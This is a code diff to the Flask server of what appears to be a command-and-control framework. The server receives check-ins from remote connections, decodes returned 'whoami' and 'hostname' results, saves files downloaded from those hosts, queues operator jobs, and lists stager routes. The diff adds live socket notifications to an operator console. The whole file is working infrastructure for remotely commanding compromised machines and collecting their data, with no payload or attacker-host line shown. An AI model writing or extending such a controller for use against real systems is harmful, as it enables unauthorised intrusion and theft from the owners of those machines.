@@ -2,7 +2,7 @@ import datetime
 import base64
 import os
 
-from connect.server import app, api_key, db, generate_id, downloads_directory
+from connect.server import app, api_key, db, generate_id, downloads_directory, socket
 from connect.server.database import Routes, Connections, Jobs
 from flask import request, jsonify
 from datetime import datetime
@@ -37,7 +37,7 @@ def check_in():
     except Exception as e:
         print(f'Failed to parse: {request.get_data()} {e}')
         return jsonify("{}")
-    uncompleted_jobs = {}
+    uncompleted_jobs = []
     for job_packet in job_packets:
         try:
             job = Jobs.query.filter_by(identifier=job_packet[0]).first()
@@ -47,6 +47,7 @@ def check_in():
                 if job.type == 0:
                     results = base64.b64decode(job_packet[1]).decode('utf-8')
                     job.results = results
+                    socket.emit('success', {'banner': f'{job.name} job from {job.connection_id} returned results!', 'results': results})
                     if job.name == 'whoami':
                         job.connection.username = results
                     if job.name == 'hostname':
@@ -56,23 +57,25 @@ def check_in():
                 if job.type == 1:
                     file_name = f'{generate_id()}.txt'
                     download_path = f'{downloads_directory}{file_name}'
+                    socket.emit('success', {'banner': f'{job.name} job from {job.connection_id} returned results!', 'results': f'Writing results to {download_path}'})
                     try:
                         with open(download_path, 'wb') as fd:
                             fd.write(base64.b64decode(job_packet[1]))
                         job.results = file_name
-                    except Exception:
+                    except Exception as e:
                         os.remove(download_path)
-                        job.results = base64.b64decode(job_packet[1]).decode('utf-8')
+                        socket.emit('failure', {'banner': f'failed to write results to {download_path} for {job.name} job.'})
             if job.name == 'check_in':
                 for job in job.connection.jobs:
                     if not job.sent:
+                        socket.emit('information', {'banner': f'Sent {job.name} job to {job.connection_id}.'})
                         job.sent = datetime.now()
-                        uncompleted_jobs.update({job.identifier: [job.name, job.arguments]})
+                        uncompleted_jobs.append({"id": str(job.identifier), "name": job.name, "arguments": job.arguments})
             db.session.add(job)
             db.session.commit()
         except Exception as e:
             print(f'Failed to parse job_packet: {job_packet} {e}')
-    return jsonify(uncompleted_jobs)
+    return jsonify({"job_packet": uncompleted_jobs})
 
 
 """
@@ -108,7 +111,7 @@ def routes():
     data = request.get_json(force=True)
     if not authenticated(data):
         return "Not authenticated"
-    return jsonify(serialize(Routes.query.all()))
+    return jsonify(serialize(Routes.query.filter_by(type='stager').all()))
 
 
 def schedule_job(name, connection, arguments, type):
@@ -133,9 +136,3 @@ def jobs():
         connection = Connections.query.filter_by(identifier=data['connection_id']).first()
         schedule_job(data['name'], connection, data['arguments'], data['type'])
         return jsonify("Job created successfully")
-    if 'connection_id' in data.keys():
-        return jsonify(serialize(
-            Jobs.query.filter_by(connection_id=data['connection_id']).order_by(desc(Jobs.created)).limit(
-                data['count']).all()))
-    return jsonify(serialize(
-        Jobs.query.order_by(desc(Jobs.created)).limit(data['count']).all()))
